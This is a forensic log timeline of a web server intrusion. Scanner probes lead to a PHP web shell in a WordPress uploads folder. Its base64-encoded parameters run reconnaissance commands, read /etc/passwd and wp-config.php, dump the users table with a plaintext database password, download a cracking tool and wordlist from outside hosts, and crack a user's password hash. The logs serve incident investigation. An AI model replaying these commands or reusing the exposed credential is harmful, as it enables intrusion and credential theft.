date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra
01/18/2022,12:17:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28569] pam_unix(cron:session): session opened for user root by (u...,[CRON  pid: 28569] pam_unix(cron:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:01,UTC,M...,LOG,Cron log,Content Modification Time,root,intranet-server,(root) CMD (   cd / && run-parts --report /etc/cron.hourly),Cron ran: cd / && run-parts --report /etc/cron.hourly for user: root pid: 28570,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,reporter: CRON; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:17:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28569] pam_unix(cron:session): session closed for user root,[CRON  pid: 28569] pam_unix(cron:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sshd  pid: 28573] Did not receive identification string from 172.17.130.196 ...,[sshd  pid: 28573] Did not receive identification string from 172.17.130.196 port 52000,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /HNAP1 HTTP/1.1 from: 172.17.130.196,http_request: GET /HNAP1 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /HNAP1 HTTP/1.1 from: 172.17.130.196,http_request: GET /HNAP1 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196,http_request: GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196,http_request: GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /sdk HTTP/1.1 from: 172.17.130.196,http_request: POST /sdk HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /sdk HTTP/1.1 from: 172.17.130.196,http_request: POST /sdk HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6134; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 9130; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,HEAD / HTTP/1.1 from: 172.17.130.196,http_request: HEAD / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 223; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zoom HTTP/1.1 from: 172.17...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zoom HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zorum HTTP/1.1 from: 172.1...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zorum HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zt HTTP/1.1 from: 172.17.1...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zt HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:00,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 9186; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:00,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /?p=5 HTTP/1.1 from: 172.17.130.196,http_request: GET /?p=5 HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 37159; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:01,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1280; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:04,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZC...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506787; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:06,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507161; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:08,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507474; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:09,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcC...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507330; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:11,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcy...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 508455; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506846; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:16,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507443; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:17,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507947; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:19,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506757; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:21,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscy...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 569644; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:23,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 509003; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:25,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507795; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:27,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507331; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28622] pam_unix(cron:session): session opened for user root by (u...,[CRON  pid: 28622] pam_unix(cron:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:39:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28622] pam_unix(cron:session): session closed for user root,[CRON  pid: 28622] pam_unix(cron:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:39:01,UTC,M...,LOG,Cron log,Content Modification Time,root,intranet-server,(root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/syst...,Cron ran: [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi for user: root pid: 28623,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,reporter: CRON; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:38:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506717; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:32,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.35.118,http_request: GET / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:32,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /favicon.ico HTTP/1.1 from: 10.35.35.118,http_request: GET /favicon.ico HTTP/1.1 from: 10.35.35.118 code: 404 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 396; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:03,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507588; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:06,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHA6Ly8xOTIuMTY4LjEzMC43Ny9yb2NreW91LnR4dCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506717; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:23,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Starting Clean php session files...,[systemd  pid: 1] Starting Clean php session files...,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:39:24,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Started Clean php session files.,[systemd  pid: 1] Started Clean php session files.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:39:11,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506876; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:45,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:41:33,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /?p=5 HTTP/1.1 from: 10.35.35.118,http_request: GET /?p=5 HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 37780; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:46:16,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5471; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:46:17,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
